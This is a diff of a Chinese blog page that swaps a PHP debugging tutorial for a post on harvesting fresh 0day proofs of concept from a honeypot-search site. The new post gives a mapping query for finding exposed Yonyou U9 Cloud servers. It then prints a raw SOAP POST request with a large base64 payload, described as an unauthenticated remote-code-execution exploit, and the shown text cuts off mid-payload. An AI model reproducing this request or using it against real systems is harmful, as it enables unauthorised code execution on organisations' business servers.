@@ -17,42 +17,34 @@
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
   
-  <title>代码审计之Mac使用flyEnv动态调试php - 博客</title>
+  <title>快速获取最新0day情报 - 博客</title>
 
   
-    <meta name="description" content="在Windows下我们可以使用PHPstudy搭建php环境进行代码审计，在macOS下我们可以使用flyEnv进行环境搭建。 flyEnv可以使用多种环境：  0.1 前期搭建0.1.1 软件安装 环境：https:&#x2F;&#x2F;github.com&#x2F;xpf0000&#x2F;FlyEnv brew：https:&#x2F;&#x2F;gitee.com&#x2F;cunkai&#x2F;HomebrewCN php版本：7.3 添加版本（如果不添加就无">
+    <meta name="description" content="安全厂商对漏洞进行披露的时候一般会披露出漏洞的产品的名称以及漏洞复现截图，此时我们可以借助nextrap网站搜索蜜罐捕捉到的POC。 nextrap地址：https:&#x2F;&#x2F;www.nextrap.net&#x2F; 0.1 nextrap搜索技巧nextrap官网描述：  其中我们可以通过特定的语法检索POC： 0.1.1 实战搜索 用友U9 Cloud 命令执行漏洞描述  最新披露的用友U9 Cloud 未">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计之Mac使用flyEnv动态调试php">
-<meta property="og:url" content="http://example.com/posts/54078.html">
+<meta property="og:title" content="快速获取最新0day情报">
+<meta property="og:url" content="http://example.com/posts/16615.html">
 <meta property="og:site_name" content="博客">
-<meta property="og:description" content="在Windows下我们可以使用PHPstudy搭建php环境进行代码审计，在macOS下我们可以使用flyEnv进行环境搭建。 flyEnv可以使用多种环境：  0.1 前期搭建0.1.1 软件安装 环境：https:&#x2F;&#x2F;github.com&#x2F;xpf0000&#x2F;FlyEnv brew：https:&#x2F;&#x2F;gitee.com&#x2F;cunkai&#x2F;HomebrewCN php版本：7.3 添加版本（如果不添加就无">
+<meta property="og:description" content="安全厂商对漏洞进行披露的时候一般会披露出漏洞的产品的名称以及漏洞复现截图，此时我们可以借助nextrap网站搜索蜜罐捕捉到的POC。 nextrap地址：https:&#x2F;&#x2F;www.nextrap.net&#x2F; 0.1 nextrap搜索技巧nextrap官网描述：  其中我们可以通过特定的语法检索POC： 0.1.1 实战搜索 用友U9 Cloud 命令执行漏洞描述  最新披露的用友U9 Cloud 未">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721102743090.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103114926.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103320965.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103406013.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103424483.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103511404.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103554980.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103613814.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103656877.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103728661.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103858490.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103938521.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721104244430.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721104356690.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721104448656.png">
-<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721104535785.png">
-<meta property="article:published_time" content="2025-07-21T02:23:17.000Z">
-<meta property="article:modified_time" content="2025-07-21T02:47:36.101Z">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107111655824.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107111827000.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107112000849.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107112313026.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107113751200.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107112629196.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107112728087.png">
+<meta property="og:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107113214161.png">
+<meta property="article:published_time" content="2026-01-07T03:01:54.000Z">
+<meta property="article:modified_time" content="2026-01-07T03:38:13.776Z">
 <meta property="article:author" content="弱鸡">
-<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="漏洞信息">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721102743090.png">
+<meta name="twitter:image" content="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107111655824.png">
   
   
   
-  <meta name="keywords" content="代码审计">
+  <meta name="keywords" content="漏洞信息">
 
   <!-- feed -->
   
@@ -93,64 +85,54 @@
 <div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-07-21T02:23:17.000Z">2025-07-21</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-21T02:47:36.101Z">2025-07-21</time></span></div></div></div>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-01-07T03:01:54.000Z">2026-01-07</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-01-07T03:38:13.776Z">2026-01-07</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>代码审计之Mac使用flyEnv动态调试php</span></h1>
+        <h1 class="text title"><span>快速获取最新0day情报</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><p>在Windows下我们可以使用PHPstudy搭建php环境进行代码审计，在macOS下我们可以使用flyEnv进行环境搭建。</p>
-<p>flyEnv可以使用多种环境：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721102743090.png" alt="image-20250721102743090"></p>
-<h1 id="0-1-前期搭建"><a href="#0-1-前期搭建" class="headerlink" title="0.1 前期搭建"></a>0.1 前期搭建</h1><h2 id="0-1-1-软件安装"><a href="#0-1-1-软件安装" class="headerlink" title="0.1.1 软件安装"></a>0.1.1 软件安装</h2><ul>
-<li>环境：<a target="_blank" rel="noopener" href="https://github.com/xpf0000/FlyEnv">https://github.com/xpf0000/FlyEnv</a></li>
-<li><code>brew</code>：<a target="_blank" rel="noopener" href="https://gitee.com/cunkai/HomebrewCN">https://gitee.com/cunkai/HomebrewCN</a></li>
-<li>php版本：7.3<ul>
-<li>添加版本（如果不添加就无法安装7.3版本）：<code>brew tap shivammathur/php</code></li>
-<li>下载版本：<code>brew install php@7.3</code></li>
-</ul>
-</li>
-</ul>
-<h2 id="0-1-2-FlyEnv使用"><a href="#0-1-2-FlyEnv使用" class="headerlink" title="0.1.2 FlyEnv使用"></a>0.1.2 FlyEnv使用</h2><p>按照下图进行配置，其中域名可以随意输入，php版本选择我们刚刚安装的版本：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103114926.png" alt="image-20250721103114926"></p>
-<h1 id="0-2-调试配置"><a href="#0-2-调试配置" class="headerlink" title="0.2 调试配置"></a>0.2 调试配置</h1><h2 id="0-2-1-安装Xdebug扩展"><a href="#0-2-1-安装Xdebug扩展" class="headerlink" title="0.2.1 安装Xdebug扩展"></a>0.2.1 安装Xdebug扩展</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103320965.png" alt="image-20250721103320965"></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103406013.png" alt="image-20250721103406013"></p>
-<p>安装成功显示：</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103424483.png" alt="image-20250721103424483"></p>
-<h2 id="0-2-2-在php-ini中配置"><a href="#0-2-2-在php-ini中配置" class="headerlink" title="0.2.2 在php.ini中配置"></a>0.2.2 在php.ini中配置</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103511404.png" alt="image-20250721103511404"></p>
-<p>在最下面添加：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[xdebug]</span></span><br><span class="line"><span class="attr">zend_extension</span> = <span class="string">&quot;xdebug.so&quot;</span></span><br><span class="line"><span class="attr">xdebug.idekey</span> = <span class="string">&quot;PHPSTORM&quot;</span></span><br><span class="line"><span class="attr">xdebug.client_host</span> = localhost</span><br><span class="line"><span class="attr">xdebug.client_port</span> = <span class="number">9003</span></span><br><span class="line"><span class="attr">xdebug.mode</span> = debug</span><br><span class="line"><span class="attr">xdebug.profiler_append</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">xdebug.profiler_output_name</span> = cachegrind.out.%p</span><br><span class="line"><span class="attr">xdebug.start_with_request</span> = <span class="literal">yes</span></span><br><span class="line"><span class="attr">xdebug.trigger_value</span>=StartProfileForMe</span><br><span class="line"><span class="attr">xdebug.output_dir</span> = /tmp</span><br></pre></td></tr></table></figure>
+  </div><article class="md-text content"><p>安全厂商对漏洞进行披露的时候一般会披露出漏洞的产品的名称以及漏洞复现截图，此时我们可以借助<code>nextrap</code>网站搜索蜜罐捕捉到的POC。</p>
+<p>nextrap地址：<a target="_blank" rel="noopener" href="https://www.nextrap.net/">https://www.nextrap.net/</a></p>
+<h1 id="0-1-nextrap搜索技巧"><a href="#0-1-nextrap搜索技巧" class="headerlink" title="0.1 nextrap搜索技巧"></a>0.1 nextrap搜索技巧</h1><p>nextrap官网描述：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107111655824.png" alt="image-20260107111655824"></p>
+<p>其中我们可以通过特定的语法检索POC：</p>
+<h2 id="0-1-1-实战搜索-用友U9-Cloud-命令执行"><a href="#0-1-1-实战搜索-用友U9-Cloud-命令执行" class="headerlink" title="0.1.1 实战搜索 用友U9 Cloud 命令执行"></a>0.1.1 实战搜索 用友U9 Cloud 命令执行</h2><p>漏洞描述</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107111827000.png" alt="image-20260107111827000"></p>
+<p>最新披露的用友U9 Cloud 未授权远程代码执行漏洞，首先我们需要获取准确的产品名称：</p>
+<p>（用友U9 Cloud ）全称：U9-用友-智能网关-智能工厂</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107112000849.png" alt="image-20260107112000849"></p>
+<p>使用测绘语法搜索产品：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product=&quot;U9-用友-智能网关-智能工厂&quot; <span class="built_in">&amp;</span><span class="built_in">&amp;</span> url=&quot;*ervice.asmx&quot;</span><br></pre></td></tr></table></figure>
 
-<p>点击保存，并重启php服务</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103554980.png" alt="image-20250721103554980"></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103613814.png" alt="image-20250721103613814"></p>
-<h1 id="0-3-phpStorm-配置"><a href="#0-3-phpStorm-配置" class="headerlink" title="0.3 phpStorm 配置"></a>0.3 phpStorm 配置</h1><p>编辑配置</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103656877.png" alt="image-20250721103656877"></p>
-<p><code>+</code>  —&gt; 添加<code>PHP网页</code>–&gt;编辑服务器（主机名输入刚刚我们随机输入的域名）确定即可</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103728661.png" alt="image-20250721103728661"></p>
-<p>在设置中，选择调试，修改调试端口为<code>9003</code></p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20250721103858490.png" alt="image-20250721103858490"></p>
-<p>选择DBGp代理，按照下图配置</p>
-<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHPSTORM</span><br><span class="line">localhost</span><br><span class="line">9003</span><br></pre></td></tr></table></figure>
+<p>次语法解释：</p>
+<p><code>product</code> 产品名</p>
+<p><code>url</code> url路径（其中<code>*</code>为通配符）</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107112313026.png" alt="image-20260107112313026"></p>
+<p>此时我们可以通过检索信息找寻POC（如下图所示，就是最新的U9 命令执行POC）。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://imgesa-hexo-84jhs2.oss-cn-hongkong.aliyuncs.com/image-20260107113751200.png" alt="image-20260107113751200"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /U9C/CS/Office/OfficeReportCommonService.asmx HTTP/1.1</span><br><span class="line">Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 4573</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">Soap-Date: 23449262</span><br><span class="line">Soapaction: &quot;http://tempuri.org/ReleaseReport&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/[REDACTED] Safari/537.36</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">  &lt;soap:Body&gt;</span><br><span class="line">    &lt;ReleaseReport xmlns=&quot;http://tempuri.org/&quot;&gt;</span><br><span class="line">      &lt;context&gt;string&lt;/context&gt;</span><br><span class="line">   &lt;excelReportSolution&gt;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